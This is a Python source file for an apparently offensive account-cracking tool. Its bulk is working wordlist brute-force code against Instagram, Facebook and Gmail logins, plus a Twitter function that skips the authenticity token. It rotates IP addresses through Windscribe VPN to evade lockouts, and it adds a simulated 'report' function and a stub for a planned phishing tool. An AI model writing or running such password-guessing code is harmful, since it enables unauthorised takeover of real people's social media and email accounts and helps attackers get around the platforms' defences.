from rich.console import Console
import time
import os
import random
import distro
import requests
from asciiart import ascii_art
from bs4 import BeautifulSoup
import instaloader
import smtplib

console = Console()

# Color codes for terminal output
class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CYAN_BG = '\33[1;37;40m'

def clear_screen():
    os.system("clear" if os.name != "nt" else "cls")

WINDSCRIBE_COUNTRIES = [
    "TR", "US-C", "US", "US-W", "CA", "CA-W", "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"
]

def change_ip():
    """Change IP using Windscribe VPN with random country code."""
    country = random.choice(WINDSCRIBE_COUNTRIES)
    if "Arch" in distro.linux_distribution()[0]:
        os.system("sudo systemctl start windscribe")
    os.system(f"windscribe connect {country}")

def print_ascii_art():
    clear_screen()
    console.print(ascii_art, justify="center", style="#B0DAFF bold")

def print_error(message):
    print(f"\n\nERROR: {Color.RED}{message}{Color.END}\n\n")

def get_user_choice(prompt: str, valid_choices: list):
    try:
        choice = int(input(f"\n\n{Color.GREEN} {prompt}{Color.END} 〉"))
    except ValueError:
        print_error("Please enter a valid number.")
        exit()
    if choice not in valid_choices:
        print_error(f"Please enter a number in {valid_choices}.")
        exit()
    return choice


def insta_bruteforce(username, wordlist_file, use_vpn):
    """Bruteforce Instagram password using wordlist."""
    try:
        with open(f"wordlist/{wordlist_file}", "r") as f:
            passwords = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print_error("Wordlist not found. Please place your wordlist inside the 'wordlist' folder.")
        exit()

    loader = instaloader.Instaloader()

    for password in passwords:
        try:
            loader.login(username, password)
            clear_screen()
            print_ascii_art()
            console.print(f"Password found: {password}", justify="center", style="#13f41e bold")
            return True
        except Exception as e:
            if "Checkpoint" in str(e):
                clear_screen()
                print_ascii_art()
                console.print(f"Checkpoint reached with password: {password}", justify="center", style="#13f41e bold")
                return True
            else:
                clear_screen()
                print_ascii_art()
                console.print(password, justify="center", style="#ea0408 bold")
            if use_vpn:
                change_ip()
            time.sleep(0.5)
    return False


def facebook_bruteforce(username, wordlist_file, use_vpn):
    """Bruteforce Facebook account login using wordlist."""
    POST_URL = 'https://www.facebook.com/login.php'
    HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
    }

    def create_form():
        form = {}
        cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
        response = requests.get(POST_URL, headers=HEADERS)
        for cookie in response.cookies:
            cookies[cookie.name] = cookie.value
        soup = BeautifulSoup(response.text, 'html.parser')
        form_tag = soup.find('form')
        if form_tag and form_tag.input and form_tag.input.has_attr('name') and form_tag.input['name'] == 'lsd':
            form['lsd'] = form_tag.input['value']
        return form, cookies

    try:
        with open(f"wordlist/{wordlist_file}", 'r') as file:
            passwords = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print_error("Wordlist not found. Please place your wordlist inside the 'wordlist' folder.")
        exit()

    PAYLOAD, COOKIES = create_form()
    PAYLOAD['email'] = username

    for password in passwords:
        PAYLOAD['pass'] = password
        response = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)

        success_indicators = ['Find Friends', 'security code', 'Two-factor authentication', 'Log Out']
        if any(indicator in response.text for indicator in success_indicators):
            clear_screen()
            print_ascii_art()
            console.print(f"Password found: {password}", justify="center", style="#13f41e bold")
            return True
        else:
            clear_screen()
            print_ascii_art()
            console.print(password, justify="center", style="#ea0408 bold")

        if use_vpn:
            change_ip()
        time.sleep(random.choice([2, 5]))
    return False


def twitter_bruteforce(username, wordlist_file, use_vpn):
    """Bruteforce Twitter login using wordlist."""
    LOGIN_URL = 'https://twitter.com/sessions'
    HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
                      ' Chrome/58.0.3029.110 Safari/537.3'
    }

    try:
        with open(f"wordlist/{wordlist_file}", "r") as f:
            passwords = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print_error("Wordlist not found. Please place your wordlist inside the 'wordlist' folder.")
        exit()

    session = requests.Session()
    for password in passwords:
        payload = {
            "session[username_or_email]": username,
            "session[password]": password,
            "remember_me": "1",
            "return_to_ssl": "true",
            "scribe_log": "",
            "redirect_after_login": "/",
            "authenticity_token": ""
        }
        # We need authenticity_token from login page (skip here for brevity)
        # For a real implementation, get token via GET request first

        # Try login
        response = session.post(LOGIN_URL, data=payload, headers=HEADERS)
        if "Login verification" in response.text or "home" in response.url:
            clear_screen()
            print_ascii_art()
            console.print(f"Password found: {password}", justify="center", style="#13f41e bold")
            return True
        else:
            clear_screen()
            print_ascii_art()
            console.print(password, justify="center", style="#ea0408 bold")

        if use_vpn:
            change_ip()
        time.sleep(random.choice([2, 5]))
    return False


def gmail_bruteforce(username, wordlist_file, use_vpn):
    """Bruteforce Gmail login via SMTP."""
    try:
        with open(f"wordlist/{wordlist_file}", "r") as f:
            passwords = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print_error("Wordlist not found. Please place your wordlist inside the 'wordlist' folder.")
        exit()

    for password in passwords:
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(username, password)
            clear_screen()
            print_ascii_art()
            console.print(f"Password found: {password}", justify="center", style="#13f41e bold")
            server.quit()
            return True
        except smtplib.SMTPAuthenticationError:
            clear_screen()
            print_ascii_art()
            console.print(password, justify="center", style="#ea0408 bold")
            if use_vpn:
                change_ip()
            time.sleep(random.choice([2, 5]))
        except Exception as e:
            print_error(str(e))
            return False
    return False


def account_report(username, platform):
    """Fake reporting function (to be updated with working APIs)."""
    console.print(f"Reporting {username} on {platform} ...", style="bold yellow")
    time.sleep(2)
    console.print("Report submitted successfully (simulation).", style="bold green")
    return True


def phishing_tool():
    """Stub for phishing tool (to be implemented)."""
    console.print("Phishing tool coming soon!", style="bold cyan")
